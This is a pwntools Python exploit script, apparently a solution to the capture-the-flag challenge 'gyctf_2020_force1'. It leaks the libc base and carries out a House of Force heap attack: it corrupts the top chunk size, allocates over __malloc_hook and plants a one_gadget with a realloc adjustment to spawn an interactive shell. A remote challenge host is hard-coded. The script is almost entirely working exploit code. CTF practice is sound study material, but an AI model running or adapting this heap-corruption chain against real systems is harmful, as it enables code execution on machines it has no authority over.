#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './gyctf_2020_force1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.23.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('2:puts\n')

def add(size, con):
    eat()
    p.sendline('1')
    p.recvuntil('size\n')
    p.sendline(str(size))
    p.recvuntil('content\n')
    p.send(con)

eat()
p.sendline('1')
p.recvuntil('size\n')
p.sendline(str(0x20000))
p.recvuntil('bin addr ')
libc.address = int(p.recvuntil('\n',drop = 'True'),16)-0x5c6010
log.success("libc.address: "+hex(libc.address))
malloc_hook = libc.symbols["__malloc_hook"]
log.success("malloc_hook: "+hex(malloc_hook))
realloc_addr = libc.symbols["realloc"]
log.success("realloc_addr: "+hex(realloc_addr))
realloc_hook = malloc_hook - 0x8
log.success('realloc_hook: ' + hex(realloc_hook))
p.recvuntil('content\n')
p.send('1')

eat()
p.sendline('1')
p.recvuntil('size\n')
p.sendline(str(0x10))
p.recvuntil('bin addr ')
top_last_addr = int(p.recvuntil("\n",drop = True),base = 16) - 0x10
top_addr = top_last_addr + 0x20
log.success("top_addr:" + hex(top_addr))
p.recvuntil('content\n')
p.send(b'a' * 0x10 + p64(0) + p64(0xffffffffffffffff))

offset = libc.symbols["__malloc_hook"] - 0x20 - top_addr - 0x10 #! -0x10-0x17 都可以
log.success('offset: ' + hex(offset))

one_array = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadgets = one_array[1] + libc.address

add(offset, '1')

add(0x10, p64(0) + p64(one_gadgets) + p64(realloc_addr+0x10))

eat()
p.sendline('1')
p.recvuntil('size\n')
p.sendline(str(1))

p.interactive()
